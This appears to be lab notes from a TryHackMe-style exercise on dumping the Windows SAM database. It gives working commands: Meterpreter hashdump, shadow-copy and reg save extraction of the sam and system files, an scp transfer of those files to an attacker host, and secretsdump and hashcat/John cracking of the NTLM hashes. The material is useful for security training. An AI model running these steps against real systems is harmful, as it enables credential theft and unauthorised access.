**Security Account Manager (SAM)**

The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. <br>
The ```sam``` file is stored in :
```
c:\Windows\System32\config\sam
```
And the decryption key used to secure this file is stored in:
```
c:\Windows\System32\config\system
```
There are various ways and attacks to dump the content of the SAM database:
1- **Metasploit's HashDump**
```
meterpreter > getuid
Server username: THM\Administrator
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3b784d80d18385cea5ab3aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:443e64439a4b7fe780db47fc06a3342d:::
```
2- **Volume Shadow Copy Service**

The Volume Shadow Copy Service (VSS) is a Windows service that allows you to create backup copies or snapshots of computer files or volumes, even when they are in use.
<br>
To make a backup of ```C:\```  we should run the cmd.exe with administrator privileges. Then execute the following ```wmic``` command:
```
C:\Users\Administrator> wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";
};
```
Once the command is successfully executed, let's use the vssadmin, Volume Shadow Copy Service administrative command-line tool, to list and confirm that we have a shadow copy of the C: volume. <br>

```
C:\Users\Administrator> vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {0c404084-8ace-4cb8-a7ed-7d7ec659bb5f}
   Contained 1 shadow copies at creation time: 5/31/2022 1:45:05 PM
      Shadow Copy ID: {d8a11619-474f-40ae-a5a0-c2faa1d78b85}
         Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Creds-Harvesting-AD.thm.red
         Service Machine: Creds-Harvesting-AD.thm.red
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential

```
The output shows that we have successfully created a shadow copy volume of (C:) with the following path: ```\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1``` this path contains all ```C:\``` data. <br>
Now let's copy both files (sam and system) from the shadow copy volume we generated to the desktop as follows:

```           
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
        1 file(s) copied.

C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.
```
2.2-**Registry Hives**

Another possible method for dumping the SAM database content is through the Windows Registry:
```
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
```
At this point we should move these two files to our local machine
```
scp sam-reg <our username>@<our ip>:/home/kali
scp system-reg <our username>@<our ip>:/home/kali
```
Let's this time decrypt it using one of the Impacket tools: ```secretsdump.py```
```
python3 secretsdump.py -sam /path/to/sam-reg -system /path/to/system-reg LOCAL
```
the result may look like this:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```
Finally, we will use **hashcat** tool to crack these NTML hashes.
```
hashcat -m 1000 -a 0 hash.txt /path/to/wordlist.txt
```
Using john the ripper
```
john --format=NT hash.txt
#THEN
john --show hashes.txt
```











